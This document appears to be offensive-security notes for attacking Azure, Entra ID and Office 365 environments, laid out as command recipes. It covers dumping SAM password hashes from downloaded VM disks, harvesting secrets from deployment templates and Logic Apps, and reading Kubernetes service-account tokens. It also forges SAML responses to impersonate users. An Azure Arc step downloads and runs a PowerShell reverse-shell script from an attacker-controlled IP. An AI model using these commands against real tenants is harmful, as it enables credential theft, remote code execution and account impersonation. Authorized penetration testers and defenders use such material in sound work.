### Read password hashes from virtual machine
- Download the disk https://docs.microsoft.com/en-us/azure/virtual-machines/windows/download-vhd#generate-download-url

#### Check the disks
```
sudo fdisk –l
```

#### Mount the disk
```
sudo mkdir /media/mounted-drive
sudo mount /dev/sdc4 /media/mounted-drive/
```

#### Navigate to the windows snapshot
```
cd /media/mounted-drive/
ls
```

#### Copy system/SAM and dump hashes
```
cd /media/mounted-drive/Windows/System32/config/
cp SAM SYSTEM ~/
cd ~/
impacket-secretsdump -system SYSTEM -sam SAM LOCAL
```

### Execute commands
- Requires the "Virtual Machine Contributor" role
- Run as default by SYSTEM or root
- Commandid =  RunPowerShellScript or RunShellScript
```
Invoke-AzVMRunCommand -ResourceGroupName <resource group name> -VMName <VM name> -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

### Reset password from VM
- Can be done from Azure portal
- This may be a quick way to gain access and avoid PowerShell alerting
- Be careful though as scripts/services may be using the credential

## Deployments
#### Check access to any resource group
```
Get-AzResourceGroup
```

### Check if you read any deployment from the resource group:
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCE GROUP NAME>
```

#### Save the deployment template
```
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName <RESOURCE GROUP> -DeploymentName <DEPLOYMENT NAME>
```

#### Find passwords in the template
- Or manually scan through it!
```
cat <PATH TO .json FILE> | Select-String password
```

## Arm Templates and Deployment History
- Any user with permissions `Microsoft.Resources/deployments/read` and `Microsoft.Resources/subscriptions/resourceGroups/read` can read the deployment history.
- Login to the azure portal
- Go to the deployments under settings and check the template for passwords or anything!
- Not sure if its possible by commands in any module!

## Function apps continuous deployment
- In case continuous deployment is used, a source code update triggers a deployment to Azure. 
- Following source code locations are supported
  - Azure Repos
  - GitHub
  - Bitbucket
- May be able to escalate privileges if we can own a continuous deployment and execute code on anything or add users!

## Logic App
- Run history may contain sensitive information like passwords and secrets (can be obfuscated and/or IP restricted).
- If IP based restriction and authentication is not enabled for HTTP triggers, anyone who knows the callback URL can trigger the logic app
- A user with `Microsoft.Logic/workflows/read` permissions can read the logic app workflow that may contain sensitive information like passwords, secrets and input parameters .

#### List the logic app
- Requires permissions `Microsoft.Logic/workflows/read`

```
Get-AzLogicApp -Name <NAME>
```

#### Read the definition
- Check for triggerURL, Usually triggerURL is not present in the definition. 

```
(Get-AzLogicApp -Name <NAME>).Definition
```

### Read logic app workflow
#### Read trigger
- Requires `Microsoft.Logic/workflows/triggers/read`

```
Get-AzResource

Get-AzLogicAppTrigger -Name <NAME> -ResourceGroupName <GROUP NAME>
```

#### Read callback url from trigger
- Requires `Microsoft.Logic/workflows/triggers/listCallbackUrl/action`

```
$data = Get-AzLogicAppTriggerCallbackUrl -Name <NAME> -ResourceGroupName <GROUP NAME> -TriggerName <TRIGGER NAME>

$data
```

#### Read workflow
- Uses `$data` from previous command

```
Invoke-RestMethod -Method POST -UseBasicParsing -Uri $data.value
```

- Copy the trigger URL
- Check for `case: <NAME>` names

#### Invoke Cases
```
$TriggerURL = "<TRIGGER URL>"
$Case = "<CASE NAME>"
$Method = "GET" # OR POST

$CaseURL = $TriggerURL.Replace('{action}',$Case)
Invoke-RestMethod -Method $Method -UseBasicParsing -Uri $CaseURL
```

## Azure Container Registry dump
- https://github.com/NetSPI/MicroBurst 
```
Get-AzPasswords
Get-AzACR
```

## Azure ARC
- Manage normal servers (Windows and Linux) within Azure using ARC
- All roles with `Microsoft.HybridCompute/machines/extensions/write` permission are able to install or update an Azure Arc Extension. Some of them are:
  - Owner, Contributor, Azure Connected Machine Resource Administrator, Hybrid Server Resource Administrator, Windows Admin Center Administrator Login

#### Check azure arc
- Login to azure Portal and check for connected machines in Azure Arc

#### Retrieve the local IP address of the server:
```
az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name ipconfig --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'ipconfig'}" --location "eastus"
```

#### Retrieve interactive shell on the machine
```
az connectedmachine extension create --machine-name i-0ef6d7a83a00e --resource-group AzureArc-RG --name RemoteCode --type "CustomScriptExtension" --publisher "Microsoft.Compute" --settings "{'commandToExecute':'powershell -c iex(New-Object Net.Webclient).downloadstring(\'http://<IP>/Invoke-PowerShellTcp.ps1\')'}" --location "eastus"
```

### Execute commands on arc enabled server
- Requires role Azure Arc VMWare Contributor
- Uses `Az.ConnectedMachine` module

```
New-AzConnectedMachineRunCommand -MachineName <MACHINE NAME> -ResourceGroupName <RESOURCE GROUP NAME> -RunCommandName '<NAME>' -Location '<LOCATION>' -SourceScript "<COMMAND TO EXECUTE>"
```

### Extensions
- Arc-enabled servers can have extensions allowlist and blocklist.
- Microsoft highlights that Custom Script extension could be blocked.
- Extensions like OpenSSH and Admin Center can still be abused to access an Arc-enabled server.
	- with ability to run commands on a server, it is possible to modify or remove allowlists and blocklists.
- Possible to install extensions on the vm with `Microsoft.HybridCompute/machines/extensions/write`

### Read deployments
- Permissions: `Microsoft.Resource/deployments/read`

## Kubernetes
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting

#### Check if machine is kubernetes
```
ls -lsa /var/run/secrets/
```

#### Check for secrets of serviceaccount
- Contains the files:
  - `ca.crt`: It's the ca certificate to check kubernetes communications
  - `namespace`: It indicates the current namespace
  - `token`: It contains the service token of the current pod.

```
ls -lsa /run/secrets/kubernetes.io/serviceaccount
ls -lsa /var/run/secrets/kubernetes.io/serviceaccount
ls -lsa /secrets/kubernetes.io/serviceaccount

cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Enum with kubectl
- https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting/kubernetes-enumeration

#### Get services
```
./kubectl get services
```

#### Retrieve pods
```
./kubectl get pods
```

#### Check if we can view namespace
```
./kubectl describe pods
```

## File shares
### Using Kerberos Auth
- Requirements: 
	- Only works for synced users
	- Entra or Hybrid joined machine.
	- Only one auth method available

#### Check if storage account is using Kerberos auth
- Property `DirectoryServiceOptions` should have `AADKERB`

```
Get-AzResource

Get-AzStorageAccount | select -ExpandProperty AzureFilesIdentityBasedAuth | Format-List

Get-AzStorageAccount | select -ExpandProperty AzureFilesIdentityBasedAuth | Where-Object -Property DirectoryServiceOptions -EQ AADKERB
```

#### Find user
- Enumerate the portal for a synced user and check for a role/group which can access the share

#### Reset password of user
- Link to RESET password of user

#### Check if machine is AzureADJoined
```
dsregcmd /status
```

#### Dir the fileshare
```
Invoke-RunasCs -Domain AzureAD -Username <USER> -Password <PASSWORD> -Command "cmd.exe /c dir \\<FQDN MACHINE>\<SHARE>"
```

## Azure SQL
- Supports Entra ID authentication and can be assigned a managed identity.

### SQL Server Links
- Just as with MSSQL Azure SQL can have database links. Links cannot be created to a logical server but only to a database.
- SQL authentication, managed identity and Entra authentication is supported.
- Possible to go from On-Prem to Azure SQL!

#### Check for links
```
EXECUTE ('Select name from sys.servers');
```

#### Check link for links
```
EXECUTE ('Select name from sys.servers') AT [<NAME>];
```

#### Retrieve database names
```
$ServerName = '<STRING>'

EXECUTE ('sp_catalogs $ServerName') AT [<NAME>];
```

#### Retrieve table names
```
$ServerName = '<STRING>'
$DBName = '<STRING>'

EXECUTE ('sp_tables_ex @table_server = $ServerName, @table_catalog = $DBName') AT [<NAME>]
```

#### Retrieve data
```
$ServerName = '<STRING>'
$DBName = '<STRING>'

EXECUTE ('SELECT * FROM [$ServerName].[$DBName].[dbo].[inventory]') AT [<NAME>]
```

## Silver SAML
- If an attacker retrieves the external certificate that is configured to sign the SAML Response, they can gain access as any user
- Requires the certificate of the Azure Enterprise Application SSO

#### Forge SAMLResponse
- https://github.com/Semperis/SilverSamlForger
- Turn on burp, Open the Burp Browser and Login with SSO and forward requests till the `POST /sso/saml` request
- Send request to repeater
- Forge new SAML Request with command below
	- Parameters
		- `--idpid` Retrieve `Microsoft Entra Identifier` from Single sign-on page of the enterprise application
		- `--recipient` and `--audience` Retrieve `Reply URL (Assertion Consumer Service URL)` from Single sign-on page of the enterprise application
		- `<TENANT ID>` is in multiple URLs on the page. Retrieve from `App Federation Metadata Url`
		- `<OBJECT IDENTIFIER OF TARGET USER>` Get from target user in Entra ID
		- `<DISPLAYNAME OF TARGET USER>` Idem
		- `<MICROSOFT ENTRA IDENTIFIER>` Retrieve `Microsoft Entra Identifier` from Single sign-on page of the enterprise application

```
.\SilverSAMLForger.exe generate --pfxPath <PATH TO PFX> --pfxPassword <PFX PASSWORD> --idpid <URL> --recipient <URL> --subjectnameid <TARGET USER UPN> --audience <URL> --attributes http://schemas.microsoft.com/identity/claims/tenantid=<TENANT ID>,http://schemas.microsoft.com/identity/claims/objectidentifier=<OBJECT IDENTIFIER OF TARGET USER>,http://schemas.microsoft.com/identity/claims/displayname=<DISPLAYNAME OF TARGET USER>,http://schemas.microsoft.com/identity/claims/identityprovider=<MICROSOFT ENTRA IDENTIFIER>/,http://schemas.microsoft.com/claims/authnmethodsreferences=http://schemas.microsoft.com/ws/2008/06/identity/authenticationmethod/password,http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress=<TARGET USER UPN>,http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name=<TARGET USER UPN>
```

- Copy the SAML Response and replace it in repeater, including RelayState variable
- Send the request and in the Reponse right click and select Show Response in Browser
- Open a private windows in the Burp Browser and paste the URL

## Office 365
### Updateable groups
- https://github.com/dafthack/GraphRunner

#### Check for updateable groups
```
Get-UpdatableGroups -Tokens $tokens
```

#### Add to interesting group
```
Invoke-AddGroupMember -Tokens $tokens -GroupId <ID> -userId <USERID>
```

#### Check for access of group
- Browse through the Teams channel and SharePoint files for interesting data!
